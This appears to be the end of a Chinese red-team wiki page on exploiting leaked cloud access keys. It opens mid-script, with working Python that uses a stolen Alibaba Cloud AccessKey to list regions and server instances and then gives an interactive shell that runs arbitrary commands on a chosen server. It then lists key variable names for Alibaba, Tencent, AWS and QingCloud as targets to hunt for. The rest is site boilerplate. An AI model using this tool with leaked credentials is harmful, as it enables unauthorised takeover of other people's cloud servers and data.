    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        Cmd = str(input(<span class="hljs-string">&quot;\033[5;37mC:\Windows\System32&gt; \033[0m&quot;</span>.format(ZhuJi_ID)))
        <span class="hljs-keyword">if</span> Cmd == <span class="hljs-string">&quot;exit&quot;</span>:
            print(<span class="hljs-string">&quot;\033[1;31m-&#x6B63;&#x5728;&#x9000;&#x51FA;&#x4E3B;&#x673A; {}.....  \033[0m&quot;</span>.format(ZhuJi_ID))
            <span class="hljs-keyword">break</span>
        Windows_exec(client, Cmd, ZhuJi_ID)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Windows_exec</span><span class="hljs-params">(client, Cmd, ZHUJI_ID)</span>:</span>
    request = RunCommandRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)

    request.set_Type(<span class="hljs-string">&quot;RunBatScript&quot;</span>)
    request.set_CommandContent(Cmd)
    request.set_InstanceIds([ZHUJI_ID])
    request.set_Name(<span class="hljs-string">&quot;PeiQi&quot;</span>)
    request.set_Description(<span class="hljs-string">&quot;PeiQi&quot;</span>)
    request.set_Timed(<span class="hljs-keyword">False</span>)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    CommandId = json.loads(response)[<span class="hljs-string">&apos;CommandId&apos;</span>]
    InvokeId  = json.loads(response)[<span class="hljs-string">&apos;InvokeId&apos;</span>]
    <span class="hljs-comment">#print(CommandId, InvokeId)</span>
    time.sleep(<span class="hljs-number">1</span>)
    request = DescribeInvocationResultsRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)

    request.set_InvokeId(InvokeId)
    request.set_InstanceId(ZHUJI_ID)
    request.set_CommandId(CommandId)
    request.set_ContentEncoding(<span class="hljs-string">&quot;PlainText&quot;</span>)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    Output = json.loads(response)[<span class="hljs-string">&apos;Invocation&apos;</span>][<span class="hljs-string">&apos;InvocationResults&apos;</span>][<span class="hljs-string">&apos;InvocationResult&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;Output&quot;</span>]
    print(<span class="hljs-string">&quot;\033[1;32m{}\033[0m&quot;</span>.format(Output))


<span class="hljs-comment"># &#x53EF;&#x7528;&#x5730;&#x57DF;&#x626B;&#x63CF;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Aliyun_City_Scan</span><span class="hljs-params">(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET)</span>:</span>
    Aliyun_City = {}
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET)

    request = DescribeRegionsRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):
        <span class="hljs-keyword">try</span>:
            City_Host = json.loads(response)[<span class="hljs-string">&apos;Regions&apos;</span>][<span class="hljs-string">&apos;Region&apos;</span>][i][<span class="hljs-string">&apos;RegionId&apos;</span>]
            City_Name = json.loads(response)[<span class="hljs-string">&apos;Regions&apos;</span>][<span class="hljs-string">&apos;Region&apos;</span>][i][<span class="hljs-string">&apos;LocalName&apos;</span>]
            Aliyun_City[City_Name] = City_Host
        <span class="hljs-keyword">except</span>:
            print(<span class="hljs-string">&apos;\033[1;34m ------ &#x641C;&#x7D22;&#x5230;&#x6709;{}&#x4E2A;&#x53EF;&#x4F7F;&#x7528;&#x963F;&#x91CC;&#x4E91;&#x5730;&#x57DF; ------\033[0m&apos;</span>.format(i))
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">return</span> Aliyun_City

<span class="hljs-comment"># &#x626B;&#x63CF;&#x8D26;&#x53F7;&#x4E0B;&#x53EF;&#x63A7;&#x4E3B;&#x673A;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Aliyun_Number_Scan</span><span class="hljs-params">(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City)</span>:</span>
    Aliyun_Serve_test_dict = []
    InstanceId_List = []
    <span class="hljs-keyword">for</span> City <span class="hljs-keyword">in</span> Aliyun_City.keys():
        Aliyun_City_Host = Aliyun_City[City]
        client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host)

        <span class="hljs-keyword">try</span>:
            request = DescribeInstanceStatusRequest()
            request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)
            response = client.do_action_with_exception(request)
            response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
            Aliyun_Num = json.loads(response)[<span class="hljs-string">&apos;TotalCount&apos;</span>]
            <span class="hljs-keyword">if</span> Aliyun_Num != <span class="hljs-number">0</span>:
                print(<span class="hljs-string">&quot;\033[1;34m &#x626B;&#x63CF;&#x51FA; {} &#x5171;&#x6709; {}&#x53F0;&#x4E91;&#x670D;&#x52A1;&#x5668; \033[0m&quot;</span>.format(City, Aliyun_Num))
                <span class="hljs-keyword">for</span> NUM <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, int(Aliyun_Num)):
                    InstanceId = json.loads(response)[<span class="hljs-string">&apos;InstanceStatuses&apos;</span>][<span class="hljs-string">&apos;InstanceStatus&apos;</span>][NUM][<span class="hljs-string">&apos;InstanceId&apos;</span>]
                    Aliyun_Serve_test(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict)
                    InstanceId_List.append(InstanceId)

            <span class="hljs-keyword">else</span>:
                print(<span class="hljs-string">&quot;\033[1;31m &#x626B;&#x63CF;&#x51FA; {} &#x5171;&#x6709; {}&#x53F0;&#x4E91;&#x670D;&#x52A1;&#x5668; \033[0m&quot;</span>.format(City, Aliyun_Num))
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(<span class="hljs-string">&quot;\033[1;31m &#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5931;&#x8D25;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5; API&#x5BC6;&#x94A5; \033[0m&quot;</span>, e)
            sys.exit(<span class="hljs-number">0</span>)

    print(<span class="hljs-string">&quot;\033[1;36m &#x6B64; AccessKey &#x4E0B;&#x5171;&#x6709; {} &#x53F0;&#x4E91;&#x670D;&#x52A1;&#x5668; \n\033[0m&quot;</span>.format(len(Aliyun_Serve_test_dict)))
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        ZhuJi_ID = str(input(<span class="hljs-string">&quot;\033[35m &#x8BF7;&#x8F93;&#x5165; &#x4E3B;&#x673A;ID &#x8FDB;&#x5165;&#x670D;&#x52A1;&#x5668;&#xFF1A;\n &#x4E3B;&#x673A;ID   &gt;&gt;&gt; \033[0m&quot;</span>))
        <span class="hljs-keyword">if</span> ZhuJi_ID <span class="hljs-keyword">in</span> InstanceId_List:
            <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> Aliyun_Serve_test_dict:
                <span class="hljs-keyword">if</span> ZhuJi_ID == data[<span class="hljs-string">&apos;InstanceId&apos;</span>]:
                    Zhuji_Aliyun_City_Host = data[<span class="hljs-string">&apos;Aliyun_City_Host&apos;</span>]
                    Zhuji_OS = data[<span class="hljs-string">&apos;OS&apos;</span>]
                    <span class="hljs-keyword">if</span> Zhuji_OS == <span class="hljs-string">&quot;Linux&quot;</span>:
                        Linux_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)
                    <span class="hljs-keyword">else</span>:
                        Windows_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&quot;\033[1;31m &#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5931;&#x8D25;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5; &#x4E3B;&#x673A;ID&#x662F;&#x5426;&#x6B63;&#x786E; \033[0m&quot;</span>)



<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Aliyun_Serve_test</span><span class="hljs-params">(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict)</span>:</span>
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)
    InstanceId = [InstanceId]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)

    NUM = int(NUM) + <span class="hljs-number">1</span>
    OSName = json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;OSName&apos;</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Windows&quot;</span> <span class="hljs-keyword">in</span> OSName:
        OS = <span class="hljs-string">&quot;Windows&quot;</span>
    <span class="hljs-keyword">else</span>:
        OS = <span class="hljs-string">&quot;Linux&quot;</span>
    IpAddress_1 = json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;VpcAttributes&apos;</span>][<span class="hljs-string">&apos;PrivateIpAddress&apos;</span>][<span class="hljs-string">&apos;IpAddress&apos;</span>][<span class="hljs-number">0</span>]
    IpAddress_2 = json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;PublicIpAddress&apos;</span>][<span class="hljs-string">&apos;IpAddress&apos;</span>][<span class="hljs-number">0</span>]
    InstanceName = json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;InstanceName&apos;</span>]
    InstanceId = InstanceId[<span class="hljs-number">0</span>]
    Aliyun_Serve_test_dict.append({
        <span class="hljs-string">&quot;InstanceId&quot;</span>: InstanceId,
        <span class="hljs-string">&quot;Aliyun_City_Host&quot;</span>: Aliyun_City_Host,
        <span class="hljs-string">&quot;OS&quot;</span>:OS
    })
    <span class="hljs-comment"># Aliyun_Serve_test_dict[&quot;InstanceId&quot;] = InstanceId</span>
    <span class="hljs-comment"># Aliyun_Serve_test_dict[&quot;Aliyun_City_Host&quot;] = Aliyun_City_Host</span>
    <span class="hljs-comment"># Aliyun_Serve_test_dict[&quot;OS&quot;] = OS</span>

    print(<span class="hljs-string">&quot;\033[1;34m ({})   &#x4E3B;&#x673A;ID: {}   &#x7CFB;&#x7EDF;&#x540D;&#x79F0;: {}   \n       &#x5916;&#x7F51;IP&#xFF1A; {}\n       &#x5185;&#x7F51;IP&#xFF1A; {}   \n       &#x670D;&#x52A1;&#x5668;&#x540D;: {}\n \033[0m&quot;</span>.format(NUM, InstanceId, OSName, IpAddress_2, IpAddress_1, InstanceName))



<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    ALIYUN_ACCESSKEYID = <span class="hljs-string">&quot;xxxxxxxxxxxxx&quot;</span>
    ALIYUN_ACCESSKEYSECRET = <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxx&quot;</span>
    Aliyun_City = Aliyun_City_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET)
    InstanceId_List = Aliyun_Number_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City)
</code></pre>
<p>&#x5E38;&#x89C1;&#x7684; Access Key&#x540D;&#x79F0;</p>
<pre><code>&#x963F;&#x91CC;&#x4E91; 
ALIYUN_ACCESSKEYID
ALIYUN_ACCESSKEYSECRET

&#x817E;&#x8BAF;&#x4E91;
SecretId
SecretKey

AWS
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY

&#x9752;&#x4E91;
qy_access_key_id
qy_secret_access_key
</code></pre><p><a href="image/yunzhuji-22.png" data-lightbox="d84c7682-e46f-459a-b6f4-87a3ab68c26e" data-title=""><img src="image/yunzhuji-22.png" alt=""></a></p>
<p>&#x53C2;&#x8003;&#x7684;&#x6587;&#x7AE0;:<a href="https://www.freebuf.com/articles/web/255717.html" target="_blank">https://www.freebuf.com/articles/web/255717.html</a> </p>
<footer class="page-footer"><span class="copyright">PeiQi WiKi-RED&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
2021-02-05 12:49:38
</span></footer>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../" class="navigation navigation-prev " aria-label="Previous page: API密钥泄露">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../../../社会工程/README.md" class="navigation navigation-next " aria-label="Next page: 社会工程">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"云服务器 Access 密钥泄露","level":"2.2.1.1","depth":3,"next":{"title":"社会工程","level":"2.3","depth":1,"path":"PeiQi_WIKI/社会工程/README.md","ref":"PeiQi_WIKI/社会工程/README.md","articles":[]},"previous":{"title":"API密钥泄露","level":"2.2.1","depth":2,"path":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/README.md","ref":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/README.md","articles":[{"title":"云服务器 Access 密钥泄露","level":"2.2.1.1","depth":3,"path":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/云服务器 Access 密钥泄露/云服务器 Access 密钥泄露.md","ref":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/云服务器 Access 密钥泄露/云服务器 Access 密钥泄露.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi-RED文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WiKi-RED"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi-RED文库","language":"zh-hans","gitbook":"*","description":"WiKi-RED文库"},"file":{"path":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/云服务器 Access 密钥泄露/云服务器 Access 密钥泄露.md","mtime":"2021-02-05T04:49:38.972Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-02T07:46:39.530Z"},"basePath":"../../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../../gitbook/gitbook.js"></script>
    <script src="../../../../gitbook/theme.js"></script>
    
        
        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-alerts/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-accordion/accordionSelector.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

